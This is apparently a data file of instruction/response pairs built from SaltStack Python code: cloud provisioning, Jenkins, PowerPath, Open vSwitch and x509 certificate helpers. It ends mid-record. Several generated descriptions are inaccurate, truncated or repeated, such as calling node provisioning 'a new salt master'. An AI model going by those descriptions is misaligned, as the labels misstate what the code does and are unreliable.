{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ndeleting all the keys in keyname", "response": "def delete_(*keyname):\n    '''\n    Delete metadata\n\n    prop : string\n        name of property\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' mdata.get salt:role\n        salt '*' mdata.get user-script salt:role\n    '''\n    mdata = _check_mdata_delete()\n    valid_keynames = list_()\n    ret = {}\n\n    for k in keyname:\n        if mdata and k in valid_keynames:\n            cmd = '{0} {1}'.format(mdata, k)\n            ret[k] = __salt__['cmd.run_all'](cmd, ignore_retcode=True)['retcode'] == 0\n        else:\n            ret[k] = True\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nshow the details of a single node", "response": "def show_instance(name, call=None):\n    '''\n    List the a single node, return dict of grains.\n    '''\n    local = salt.client.LocalClient()\n    ret = local.cmd(name, 'grains.items')\n    ret.update(_build_required_items(ret))\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ncreating a new salt master", "response": "def create(vm_):\n    '''\n    if configuration parameter ``deploy`` is ``True``,\n\n        Provision a single machine, adding its keys to the salt master\n\n    else,\n\n        Test ssh connections to the machine\n\n    Configuration parameters:\n\n    - deploy:  (see above)\n    - provider:  name of entry in ``salt/cloud.providers.d/???`` file\n    - ssh_host: IP address or DNS name of the new machine\n    - ssh_username:  name used to log in to the new machine\n    - ssh_password:  password to log in (unless key_filename is used)\n    - key_filename:  (optional) SSH private key for passwordless login\n    - ssh_port: (default=22) TCP port for SSH connection\n    - wake_on_lan_mac:  (optional) hardware (MAC) address for wake on lan\n    - wol_sender_node:  (optional) salt minion to send wake on lan command\n    - wol_boot_wait:  (default=30) seconds to delay while client boots\n    - force_minion_config: (optional) replace the minion configuration files on the new machine\n\n    See also\n    :ref:`Miscellaneous Salt Cloud Options <misc-salt-cloud-options>`\n    and\n    :ref:`Getting Started with Saltify <getting-started-with-saltify>`\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt-cloud -p mymachine my_new_id\n    '''\n    deploy_config = config.get_cloud_config_value(\n        'deploy', vm_, __opts__, default=False)\n\n    # If ssh_host is not set, default to the minion name\n    if not config.get_cloud_config_value('ssh_host', vm_, __opts__, default=''):\n        vm_['ssh_host'] = vm_['name']\n\n    if deploy_config:\n        wol_mac = config.get_cloud_config_value(\n            'wake_on_lan_mac', vm_, __opts__, default='')\n        wol_host = config.get_cloud_config_value(\n            'wol_sender_node', vm_, __opts__, default='')\n        if wol_mac and wol_host:\n            good_ping = False\n            local = salt.client.LocalClient()\n            ssh_host = config.get_cloud_config_value(\n                'ssh_host', vm_, __opts__, default='')\n            if ssh_host:\n                log.info('trying to ping %s', ssh_host)\n                count = 'n' if salt.utils.platform.is_windows() else 'c'\n                cmd = 'ping -{} 1 {}'.format(count, ssh_host)\n                good_ping = local.cmd(wol_host, 'cmd.retcode', [cmd]) == 0\n            if good_ping:\n                log.info('successful ping.')\n            else:\n                log.info('sending wake-on-lan to %s using node %s',\n                         wol_mac, wol_host)\n\n                if isinstance(wol_mac, six.string_types):\n                    wol_mac = [wol_mac]  # a smart user may have passed more params\n                ret = local.cmd(wol_host, 'network.wol', wol_mac)\n                log.info('network.wol returned value %s', ret)\n                if ret and ret[wol_host]:\n                    sleep_time = config.get_cloud_config_value(\n                        'wol_boot_wait', vm_, __opts__, default=30)\n                    if sleep_time > 0.0:\n                        log.info('delaying %d seconds for boot', sleep_time)\n                        time.sleep(sleep_time)\n        log.info('Provisioning existing machine %s', vm_['name'])\n        ret = __utils__['cloud.bootstrap'](vm_, __opts__)\n    else:\n        ret = _verify(vm_)\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nverify that the credentials for an existing system is correct.", "response": "def _verify(vm_):\n    '''\n    Verify credentials for an existing system\n    '''\n    log.info('Verifying credentials for %s', vm_['name'])\n\n    win_installer = config.get_cloud_config_value(\n        'win_installer', vm_, __opts__)\n\n    if win_installer:\n\n        log.debug('Testing Windows authentication method for %s', vm_['name'])\n\n        if not HAS_IMPACKET:\n            log.error('Impacket library not found')\n            return False\n\n        # Test Windows connection\n        kwargs = {\n            'host': vm_['ssh_host'],\n            'username': config.get_cloud_config_value(\n                'win_username', vm_, __opts__, default='Administrator'),\n            'password': config.get_cloud_config_value(\n                'win_password', vm_, __opts__, default='')\n        }\n\n        # Test SMB connection\n        try:\n            log.debug('Testing SMB protocol for %s', vm_['name'])\n            if __utils__['smb.get_conn'](**kwargs) is False:\n                return False\n        except (smbSessionError, smb3SessionError) as exc:\n            log.error('Exception: %s', exc)\n            return False\n\n        # Test WinRM connection\n        use_winrm = config.get_cloud_config_value(\n            'use_winrm', vm_, __opts__, default=False)\n\n        if use_winrm:\n            log.debug('WinRM protocol requested for %s', vm_['name'])\n            if not HAS_WINRM:\n                log.error('WinRM library not found')\n                return False\n\n            kwargs['port'] = config.get_cloud_config_value(\n                'winrm_port', vm_, __opts__, default=5986)\n            kwargs['timeout'] = 10\n\n            try:\n                log.debug('Testing WinRM protocol for %s', vm_['name'])\n                return __utils__['cloud.wait_for_winrm'](**kwargs) is not None\n            except (ConnectionError, ConnectTimeout, ReadTimeout, SSLError,\n                    ProxyError, RetryError, InvalidSchema, WinRMTransportError) as exc:\n                log.error('Exception: %s', exc)\n                return False\n\n        return True\n\n    else:\n\n        log.debug('Testing SSH authentication method for %s', vm_['name'])\n\n        # Test SSH connection\n        kwargs = {\n            'host': vm_['ssh_host'],\n            'port': config.get_cloud_config_value(\n                'ssh_port', vm_, __opts__, default=22\n            ),\n            'username': config.get_cloud_config_value(\n                'ssh_username', vm_, __opts__, default='root'\n            ),\n            'password': config.get_cloud_config_value(\n                'password', vm_, __opts__, search_global=False\n            ),\n            'key_filename': config.get_cloud_config_value(\n                'key_filename', vm_, __opts__, search_global=False,\n                default=config.get_cloud_config_value(\n                    'ssh_keyfile', vm_, __opts__, search_global=False,\n                    default=None\n                )\n            ),\n            'gateway': vm_.get('gateway', None),\n            'maxtries': 1\n        }\n\n        log.debug('Testing SSH protocol for %s', vm_['name'])\n        try:\n            return __utils__['cloud.wait_for_passwd'](**kwargs) is True\n        except SaltCloudException as exc:\n            log.error('Exception: %s', exc)\n            return False"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ndestroy a node. .. versionadded:: 2018.3.0 Disconnect a minion from the master, and remove its keys. Optionally, (if ``remove_config_on_destroy`` is ``True``), disables salt-minion from running on the minion, and erases the Salt configuration files from it. Optionally, (if ``shutdown_on_destroy`` is ``True``), orders the minion to halt. CLI Example: .. code-block:: bash salt-cloud --destroy mymachine", "response": "def destroy(name, call=None):\n    ''' Destroy a node.\n\n    .. versionadded:: 2018.3.0\n\n    Disconnect a minion from the master, and remove its keys.\n\n    Optionally, (if ``remove_config_on_destroy`` is ``True``),\n      disables salt-minion from running on the minion, and\n      erases the Salt configuration files from it.\n\n    Optionally, (if ``shutdown_on_destroy`` is ``True``),\n      orders the minion to halt.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt-cloud --destroy mymachine\n\n    '''\n    if call == 'function':\n        raise SaltCloudSystemExit(\n            'The destroy action must be called with -d, --destroy, '\n            '-a, or --action.'\n        )\n\n    opts = __opts__\n\n    __utils__['cloud.fire_event'](\n        'event',\n        'destroying instance',\n        'salt/cloud/{0}/destroying'.format(name),\n        args={'name': name},\n        sock_dir=opts['sock_dir'],\n        transport=opts['transport']\n    )\n\n    vm_ = get_configured_provider()\n    local = salt.client.LocalClient()\n    my_info = local.cmd(name, 'grains.get', ['salt-cloud'])\n    try:\n        vm_.update(my_info[name])  # get profile name to get config value\n    except (IndexError, TypeError):\n        pass\n    if config.get_cloud_config_value(\n           'remove_config_on_destroy', vm_, opts, default=True\n            ):\n        ret = local.cmd(name,  # prevent generating new keys on restart\n                        'service.disable',\n                        ['salt-minion'])\n        if ret and ret[name]:\n            log.info('disabled salt-minion service on %s', name)\n        ret = local.cmd(name, 'config.get', ['conf_file'])\n        if ret and ret[name]:\n            confile = ret[name]\n            ret = local.cmd(name, 'file.remove', [confile])\n            if ret and ret[name]:\n                log.info('removed minion %s configuration file %s',\n                         name, confile)\n        ret = local.cmd(name, 'config.get', ['pki_dir'])\n        if ret and ret[name]:\n            pki_dir = ret[name]\n            ret = local.cmd(name, 'file.remove', [pki_dir])\n            if ret and ret[name]:\n                log.info(\n                    'removed minion %s key files in %s',\n                    name,\n                    pki_dir)\n\n    if config.get_cloud_config_value(\n        'shutdown_on_destroy', vm_, opts, default=False\n        ):\n        ret = local.cmd(name, 'system.shutdown')\n        if ret and ret[name]:\n            log.info('system.shutdown for minion %s successful', name)\n\n    __utils__['cloud.fire_event'](\n        'event',\n        'destroyed instance',\n        'salt/cloud/{0}/destroyed'.format(name),\n        args={'name': name},\n        sock_dir=opts['sock_dir'],\n        transport=opts['transport']\n    )\n\n    return {'Destroyed': '{0} was destroyed.'.format(name)}"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef present(name,\n            config=None,\n            **kwargs):\n    '''\n    Ensure the job is present in the Jenkins configured jobs\n\n    name\n        The unique name for the Jenkins job\n\n    config\n        The Salt URL for the file to use for configuring the job\n    '''\n\n    ret = {'name': name,\n           'result': True,\n           'changes': {},\n           'comment': ['Job {0} is up to date.'.format(name)]}\n\n    if __salt__['jenkins.job_exists'](name):\n        _current_job_config = __salt__['jenkins.get_job_config'](name)\n        buf = six.moves.StringIO(_current_job_config)\n        oldXML = ET.fromstring(buf.read())\n\n        cached_source_path = __salt__['cp.cache_file'](config, __env__)\n        with salt.utils.files.fopen(cached_source_path) as _fp:\n            newXML = ET.fromstring(salt.utils.stringutils.to_unicode(_fp.read()))\n        if not _elements_equal(oldXML, newXML):\n            diff = difflib.unified_diff(\n                ET.tostringlist(oldXML, encoding='utf8', method='xml'),\n                ET.tostringlist(newXML, encoding='utf8', method='xml'), lineterm='')\n            try:\n                __salt__['jenkins.update_job'](name, config, __env__)\n            except CommandExecutionError as exc:\n                return _fail(ret, exc.strerror)\n            else:\n                ret['changes'] = ''.join(diff)\n                ret['comment'].append('Job \\'{0}\\' updated.'.format(name))\n\n    else:\n        cached_source_path = __salt__['cp.cache_file'](config, __env__)\n        with salt.utils.files.fopen(cached_source_path) as _fp:\n            new_config_xml = salt.utils.stringutils.to_unicode(_fp.read())\n\n        try:\n            __salt__['jenkins.create_job'](name, config, __env__)\n        except CommandExecutionError as exc:\n            return _fail(ret, exc.strerror)\n\n        buf = six.moves.StringIO(new_config_xml)\n        diff = difflib.unified_diff('', buf.readlines(), lineterm='')\n        ret['changes'][name] = ''.join(diff)\n        ret['comment'].append('Job \\'{0}\\' added.'.format(name))\n\n    ret['comment'] = '\\n'.join(ret['comment'])\n    return ret", "response": "Ensure the Jenkins job is present in Jenkins configured jobs"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef absent(name,\n           **kwargs):\n    '''\n    Ensure the job is absent from the Jenkins configured jobs\n\n    name\n        The name of the Jenkins job to remove\n    '''\n    ret = {'name': name,\n           'result': True,\n           'changes': {},\n           'comment': []}\n\n    if __salt__['jenkins.job_exists'](name):\n        try:\n            __salt__['jenkins.delete_job'](name)\n        except CommandExecutionError as exc:\n            return _fail(ret, exc.strerror)\n        else:\n            ret['comment'] = 'Job \\'{0}\\' deleted.'.format(name)\n    else:\n        ret['comment'] = 'Job \\'{0}\\' already absent.'.format(name)\n    return ret", "response": "Ensure the Jenkins job is absent from the Jenkins configured jobs\n   "}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\niterating over a list of proxynames and restart any that aren t running", "response": "def _run_proxy_processes(proxies):\n    '''\n    Iterate over a list of proxy\n    names and restart any that\n    aren't running\n    '''\n    ret = []\n    for proxy in proxies:\n        result = {}\n        if not __salt__['salt_proxy.is_running'](proxy)['result']:\n            __salt__['salt_proxy.configure_proxy'](proxy, start=True)\n            result[proxy] = 'Proxy {0} was started'.format(proxy)\n        else:\n            msg = 'Proxy {0} is already running'.format(proxy)\n            result[proxy] = msg\n            log.debug(msg)\n        ret.append(result)\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef beacon(config):\n    '''\n    Handle configured proxies\n\n    .. code-block:: yaml\n\n        beacons:\n          salt_proxy:\n            - proxies:\n                p8000: {}\n                p8001: {}\n    '''\n    log.trace('salt proxy beacon called')\n\n    _config = {}\n    list(map(_config.update, config))\n\n    return _run_proxy_processes(_config['proxies'])", "response": "Handle configured proxies\n            and return a list of the processed proxies"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef list_licenses():\n    '''\n    returns a list of applied powerpath license keys\n    '''\n    KEY_PATTERN = re.compile('Key (.*)')\n\n    keys = []\n    out = __salt__['cmd.run']('/sbin/emcpreg -list')\n    for line in out.splitlines():\n        match = KEY_PATTERN.match(line)\n\n        if not match:\n            continue\n\n        keys.append({'key': match.group(1)})\n\n    return keys", "response": "returns a list of applied powerpath license keys\n    returns a list of applied powerpath license keys\n   "}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nadd a license to the specified key", "response": "def add_license(key):\n    '''\n    Add a license\n    '''\n    result = {\n        'result': False,\n        'retcode': -1,\n        'output': ''\n    }\n\n    if not has_powerpath():\n        result['output'] = 'PowerPath is not installed'\n        return result\n\n    cmd = '/sbin/emcpreg -add {0}'.format(key)\n    ret = __salt__['cmd.run_all'](cmd, python_shell=True)\n\n    result['retcode'] = ret['retcode']\n\n    if ret['retcode'] != 0:\n        result['output'] = ret['stderr']\n    else:\n        result['output'] = ret['stdout']\n        result['result'] = True\n\n    return result"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef managed(name, table, data, record=None):\n    '''\n    Ensures that the specified columns of the named record have the specified\n    values.\n\n    Args:\n        name: The name of the record.\n        table: The name of the table to which the record belongs.\n        data: Dictionary containing a mapping from column names to the desired\n            values. Columns that exist, but are not specified in this\n            dictionary are not touched.\n        record: The name of the record (optional). Replaces name if specified.\n    '''\n    ret = {'name': name, 'changes': {}, 'result': False, 'comment': ''}\n    if record is None:\n        record = name\n    current_data = {\n        column: __salt__['openvswitch.db_get'](table, record, column)\n        for column in data\n    }\n\n    # Comment and change messages\n    comment_changes = 'Columns have been updated.'\n    comment_no_changes = 'All columns are already up to date.'\n    comment_error = 'Error while updating column {0}: {1}'\n\n    # Dry run, test=true mode\n    if __opts__['test']:\n        for column in data:\n            if data[column] != current_data[column]:\n                ret['changes'][column] = {'old': current_data[column],\n                                          'new': data[column]}\n        if ret['changes']:\n            ret['result'] = None\n            ret['comment'] = comment_changes\n        else:\n            ret['result'] = True\n            ret['comment'] = comment_no_changes\n        return ret\n\n    for column in data:\n        if data[column] != current_data[column]:\n            result = __salt__['openvswitch.db_set'](table, record, column,\n                                                    data[column])\n            if result is not None:\n                ret['comment'] = comment_error.format(column, result)\n                ret['result'] = False\n                return ret\n            ret['changes'][column] = {'old': current_data[column],\n                                      'new': data[column]}\n    ret['result'] = True\n    ret['comment'] = comment_no_changes\n    return ret", "response": "Ensures that the specified columns of the named record are set to the specified values."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _fix_ctx(m2_ctx, issuer=None):\n    '''\n    This is part of an ugly hack to fix an ancient bug in M2Crypto\n    https://bugzilla.osafoundation.org/show_bug.cgi?id=7530#c13\n    '''\n    ctx = _Ctx.from_address(int(m2_ctx))  # pylint: disable=no-member\n\n    ctx.flags = 0\n    ctx.subject_cert = None\n    ctx.subject_req = None\n    ctx.crl = None\n    if issuer is None:\n        ctx.issuer_cert = None\n    else:\n        ctx.issuer_cert = int(issuer.x509)", "response": "Fixes the context of a M2Crypto\n   ."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _new_extension(name, value, critical=0, issuer=None, _pyfree=1):\n    '''\n    Create new X509_Extension, This is required because M2Crypto\n    doesn't support getting the publickeyidentifier from the issuer\n    to create the authoritykeyidentifier extension.\n    '''\n    if name == 'subjectKeyIdentifier' and value.strip('0123456789abcdefABCDEF:') is not '':\n        raise salt.exceptions.SaltInvocationError('value must be precomputed hash')\n\n    # ensure name and value are bytes\n    name = salt.utils.stringutils.to_str(name)\n    value = salt.utils.stringutils.to_str(value)\n\n    try:\n        ctx = M2Crypto.m2.x509v3_set_nconf()\n        _fix_ctx(ctx, issuer)\n        if ctx is None:\n            raise MemoryError(\n                'Not enough memory when creating a new X509 extension')\n        x509_ext_ptr = M2Crypto.m2.x509v3_ext_conf(None, ctx, name, value)\n        lhash = None\n    except AttributeError:\n        lhash = M2Crypto.m2.x509v3_lhash()  # pylint: disable=no-member\n        ctx = M2Crypto.m2.x509v3_set_conf_lhash(\n            lhash)          # pylint: disable=no-member\n        # ctx not zeroed\n        _fix_ctx(ctx, issuer)\n        x509_ext_ptr = M2Crypto.m2.x509v3_ext_conf(\n            lhash, ctx, name, value)  # pylint: disable=no-member\n    # ctx,lhash freed\n\n    if x509_ext_ptr is None:\n        raise M2Crypto.X509.X509Error(\n            \"Cannot create X509_Extension with name '{0}' and value '{1}'\".format(name, value))\n    x509_ext = M2Crypto.X509.X509_Extension(x509_ext_ptr, _pyfree)\n    x509_ext.set_critical(critical)\n    return x509_ext", "response": "Create a new X509 extension."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nparses openssl command line output and returns a dict of the resulting CSR objects.", "response": "def _parse_openssl_req(csr_filename):\n    '''\n    Parses openssl command line output, this is a workaround for M2Crypto's\n    inability to get them from CSR objects.\n    '''\n    if not salt.utils.path.which('openssl'):\n        raise salt.exceptions.SaltInvocationError(\n            'openssl binary not found in path'\n        )\n    cmd = ('openssl req -text -noout -in {0}'.format(csr_filename))\n\n    output = __salt__['cmd.run_stdout'](cmd)\n\n    output = re.sub(r': rsaEncryption', ':', output)\n    output = re.sub(r'[0-9a-f]{2}:', '', output)\n\n    return salt.utils.data.decode(salt.utils.yaml.safe_load(output))"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _get_csr_extensions(csr):\n    '''\n    Returns a list of dicts containing the name, value and critical value of\n    any extension contained in a csr object.\n    '''\n    ret = OrderedDict()\n\n    csrtempfile = tempfile.NamedTemporaryFile()\n    csrtempfile.write(csr.as_pem())\n    csrtempfile.flush()\n    csryaml = _parse_openssl_req(csrtempfile.name)\n    csrtempfile.close()\n    if csryaml and 'Requested Extensions' in csryaml['Certificate Request']['Data']:\n        csrexts = csryaml['Certificate Request']['Data']['Requested Extensions']\n\n        if not csrexts:\n            return ret\n\n        for short_name, long_name in six.iteritems(EXT_NAME_MAPPINGS):\n            if long_name in csrexts:\n                csrexts[short_name] = csrexts[long_name]\n                del csrexts[long_name]\n        ret = csrexts\n    return ret", "response": "Returns a list of dicts containing the name value and critical value of any extension contained in a CSR object."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nparses the contents of a openssl - text file and returns a dict of the keys to be used in the CSR objects.", "response": "def _parse_openssl_crl(crl_filename):\n    '''\n    Parses openssl command line output, this is a workaround for M2Crypto's\n    inability to get them from CSR objects.\n    '''\n    if not salt.utils.path.which('openssl'):\n        raise salt.exceptions.SaltInvocationError(\n            'openssl binary not found in path'\n        )\n    cmd = ('openssl crl -text -noout -in {0}'.format(crl_filename))\n\n    output = __salt__['cmd.run_stdout'](cmd)\n\n    crl = {}\n    for line in output.split('\\n'):\n        line = line.strip()\n        if line.startswith('Version '):\n            crl['Version'] = line.replace('Version ', '')\n        if line.startswith('Signature Algorithm: '):\n            crl['Signature Algorithm'] = line.replace(\n                'Signature Algorithm: ', '')\n        if line.startswith('Issuer: '):\n            line = line.replace('Issuer: ', '')\n            subject = {}\n            for sub_entry in line.split('/'):\n                if '=' in sub_entry:\n                    sub_entry = sub_entry.split('=')\n                    subject[sub_entry[0]] = sub_entry[1]\n            crl['Issuer'] = subject\n        if line.startswith('Last Update: '):\n            crl['Last Update'] = line.replace('Last Update: ', '')\n            last_update = datetime.datetime.strptime(\n                crl['Last Update'], \"%b %d %H:%M:%S %Y %Z\")\n            crl['Last Update'] = last_update.strftime(\"%Y-%m-%d %H:%M:%S\")\n        if line.startswith('Next Update: '):\n            crl['Next Update'] = line.replace('Next Update: ', '')\n            next_update = datetime.datetime.strptime(\n                crl['Next Update'], \"%b %d %H:%M:%S %Y %Z\")\n            crl['Next Update'] = next_update.strftime(\"%Y-%m-%d %H:%M:%S\")\n        if line.startswith('Revoked Certificates:'):\n            break\n\n    if 'No Revoked Certificates.' in output:\n        crl['Revoked Certificates'] = []\n        return crl\n\n    output = output.split('Revoked Certificates:')[1]\n    output = output.split('Signature Algorithm:')[0]\n\n    rev = []\n    for revoked in output.split('Serial Number: '):\n        if not revoked.strip():\n            continue\n\n        rev_sn = revoked.split('\\n')[0].strip()\n        revoked = rev_sn + ':\\n' + '\\n'.join(revoked.split('\\n')[1:])\n        rev_yaml = salt.utils.data.decode(salt.utils.yaml.safe_load(revoked))\n        # pylint: disable=unused-variable\n        for rev_item, rev_values in six.iteritems(rev_yaml):\n            # pylint: enable=unused-variable\n            if 'Revocation Date' in rev_values:\n                rev_date = datetime.datetime.strptime(\n                    rev_values['Revocation Date'], \"%b %d %H:%M:%S %Y %Z\")\n                rev_values['Revocation Date'] = rev_date.strftime(\n                    \"%Y-%m-%d %H:%M:%S\")\n\n        rev.append(rev_yaml)\n\n    crl['Revoked Certificates'] = rev\n\n    return crl"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _pretty_hex(hex_str):\n    '''\n    Nicely formats hex strings\n    '''\n    if len(hex_str) % 2 != 0:\n        hex_str = '0' + hex_str\n    return ':'.join(\n        [hex_str[i:i + 2] for i in range(0, len(hex_str), 2)]).upper()", "response": "Nicely formats hex strings\n   "}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ndetermine if input is a file or a string with the Taxonomy content to be parsed.", "response": "def _text_or_file(input_):\n    '''\n    Determines if input is a path to a file, or a string with the\n    content to be parsed.\n    '''\n    if _isfile(input_):\n        with salt.utils.files.fopen(input_) as fp_:\n            out = salt.utils.stringutils.to_str(fp_.read())\n    else:\n        out = salt.utils.stringutils.to_str(input_)\n\n    return out"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreturn a dict containing all values in an X509 Subject", "response": "def _parse_subject(subject):\n    '''\n    Returns a dict containing all values in an X509 Subject\n    '''\n    ret = {}\n    nids = []\n    for nid_name, nid_num in six.iteritems(subject.nid):\n        if nid_num in nids:\n            continue\n        try:\n            val = getattr(subject, nid_name)\n            if val:\n                ret[nid_name] = val\n                nids.append(nid_num)\n        except TypeError as err:\n            log.debug(\"Missing attribute '%s'. Error: %s\", nid_name, err)\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _get_certificate_obj(cert):\n    '''\n    Returns a certificate object based on PEM text.\n    '''\n    if isinstance(cert, M2Crypto.X509.X509):\n        return cert\n\n    text = _text_or_file(cert)\n    text = get_pem_entry(text, pem_type='CERTIFICATE')\n    return M2Crypto.X509.load_cert_string(text)", "response": "Returns a certificate object based on PEM text."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreturning a private key object based on PEM text.", "response": "def _get_private_key_obj(private_key, passphrase=None):\n    '''\n    Returns a private key object based on PEM text.\n    '''\n    private_key = _text_or_file(private_key)\n    private_key = get_pem_entry(private_key, pem_type='(?:RSA )?PRIVATE KEY')\n    rsaprivkey = M2Crypto.RSA.load_key_string(\n        private_key, callback=_passphrase_callback(passphrase))\n    evpprivkey = M2Crypto.EVP.PKey()\n    evpprivkey.assign_rsa(rsaprivkey)\n    return evpprivkey"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreturn a callback function used to supply a passphrase for private keys", "response": "def _passphrase_callback(passphrase):\n    '''\n    Returns a callback function used to supply a passphrase for private keys\n    '''\n    def f(*args):\n        return salt.utils.stringutils.to_bytes(passphrase)\n    return f"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _get_request_obj(csr):\n    '''\n    Returns a CSR object based on PEM text.\n    '''\n    text = _text_or_file(csr)\n    text = get_pem_entry(text, pem_type='CERTIFICATE REQUEST')\n    return M2Crypto.X509.load_request_string(text)", "response": "Returns a CSR object based on PEM text."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns the sha1 hash of the modulus of a public key in a cert Used for generating subject key identifiers", "response": "def _get_pubkey_hash(cert):\n    '''\n    Returns the sha1 hash of the modulus of a public key in a cert\n    Used for generating subject key identifiers\n    '''\n    sha_hash = hashlib.sha1(cert.get_pubkey().get_modulus()).hexdigest()\n    return _pretty_hex(sha_hash)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nreturn a properly formatted PEM string from the input text removing any whitespace or line - break issues and adding a new entry to the output.", "response": "def get_pem_entry(text, pem_type=None):\n    '''\n    Returns a properly formatted PEM string from the input text fixing\n    any whitespace or line-break issues\n\n    text:\n        Text containing the X509 PEM entry to be returned or path to\n        a file containing the text.\n\n    pem_type:\n        If specified, this function will only return a pem of a certain type,\n        for example 'CERTIFICATE' or 'CERTIFICATE REQUEST'.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' x509.get_pem_entry \"-----BEGIN CERTIFICATE REQUEST-----MIICyzCC Ar8CAQI...-----END CERTIFICATE REQUEST\"\n    '''\n    text = _text_or_file(text)\n    # Replace encoded newlines\n    text = text.replace('\\\\n', '\\n')\n\n    _match = None\n\n    if len(text.splitlines()) == 1 and text.startswith(\n            '-----') and text.endswith('-----'):\n        # mine.get returns the PEM on a single line, we fix this\n        pem_fixed = []\n        pem_temp = text\n        while pem_temp:\n            if pem_temp.startswith('-----'):\n                # Grab ----(.*)---- blocks\n                pem_fixed.append(pem_temp[:pem_temp.index('-----', 5) + 5])\n                pem_temp = pem_temp[pem_temp.index('-----', 5) + 5:]\n            else:\n                # grab base64 chunks\n                if pem_temp[:64].count('-') == 0:\n                    pem_fixed.append(pem_temp[:64])\n                    pem_temp = pem_temp[64:]\n                else:\n                    pem_fixed.append(pem_temp[:pem_temp.index('-')])\n                    pem_temp = pem_temp[pem_temp.index('-'):]\n        text = \"\\n\".join(pem_fixed)\n\n    _dregex = _make_regex('[0-9A-Z ]+')\n    errmsg = 'PEM text not valid:\\n{0}'.format(text)\n    if pem_type:\n        _dregex = _make_regex(pem_type)\n        errmsg = ('PEM does not contain a single entry of type {0}:\\n'\n                  '{1}'.format(pem_type, text))\n\n    for _match in _dregex.finditer(text):\n        if _match:\n            break\n    if not _match:\n        raise salt.exceptions.SaltInvocationError(errmsg)\n    _match_dict = _match.groupdict()\n    pem_header = _match_dict['pem_header']\n    proc_type = _match_dict['proc_type']\n    dek_info = _match_dict['dek_info']\n    pem_footer = _match_dict['pem_footer']\n    pem_body = _match_dict['pem_body']\n\n    # Remove all whitespace from body\n    pem_body = ''.join(pem_body.split())\n\n    # Generate correctly formatted pem\n    ret = pem_header + '\\n'\n    if proc_type:\n        ret += proc_type + '\\n'\n    if dek_info:\n        ret += dek_info + '\\n' + '\\n'\n    for i in range(0, len(pem_body), 64):\n        ret += pem_body[i:i + 64] + '\\n'\n    ret += pem_footer + '\\n'\n\n    return salt.utils.stringutils.to_bytes(ret, encoding='ascii')"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning a dict containing PEM entries in files matching a glob_path", "response": "def get_pem_entries(glob_path):\n    '''\n    Returns a dict containing PEM entries in files matching a glob\n\n    glob_path:\n        A path to certificates to be read and returned.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' x509.get_pem_entries \"/etc/pki/*.crt\"\n    '''\n    ret = {}\n\n    for path in glob.glob(glob_path):\n        if os.path.isfile(path):\n            try:\n                ret[path] = get_pem_entry(text=path)\n            except ValueError as err:\n                log.debug('Unable to get PEM entries from %s: %s', path, err)\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef read_certificate(certificate):\n    '''\n    Returns a dict containing details of a certificate. Input can be a PEM\n    string or file path.\n\n    certificate:\n        The certificate to be read. Can be a path to a certificate file, or\n        a string containing the PEM formatted text of the certificate.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' x509.read_certificate /etc/pki/mycert.crt\n    '''\n    cert = _get_certificate_obj(certificate)\n\n    ret = {\n        # X509 Version 3 has a value of 2 in the field.\n        # Version 2 has a value of 1.\n        # https://tools.ietf.org/html/rfc5280#section-4.1.2.1\n        'Version': cert.get_version() + 1,\n        # Get size returns in bytes. The world thinks of key sizes in bits.\n        'Key Size': cert.get_pubkey().size() * 8,\n        'Serial Number': _dec2hex(cert.get_serial_number()),\n        'SHA-256 Finger Print': _pretty_hex(cert.get_fingerprint(md='sha256')),\n        'MD5 Finger Print': _pretty_hex(cert.get_fingerprint(md='md5')),\n        'SHA1 Finger Print': _pretty_hex(cert.get_fingerprint(md='sha1')),\n        'Subject': _parse_subject(cert.get_subject()),\n        'Subject Hash': _dec2hex(cert.get_subject().as_hash()),\n        'Issuer': _parse_subject(cert.get_issuer()),\n        'Issuer Hash': _dec2hex(cert.get_issuer().as_hash()),\n        'Not Before':\n        cert.get_not_before().get_datetime().strftime('%Y-%m-%d %H:%M:%S'),\n        'Not After':\n        cert.get_not_after().get_datetime().strftime('%Y-%m-%d %H:%M:%S'),\n        'Public Key': get_public_key(cert)\n    }\n\n    exts = OrderedDict()\n   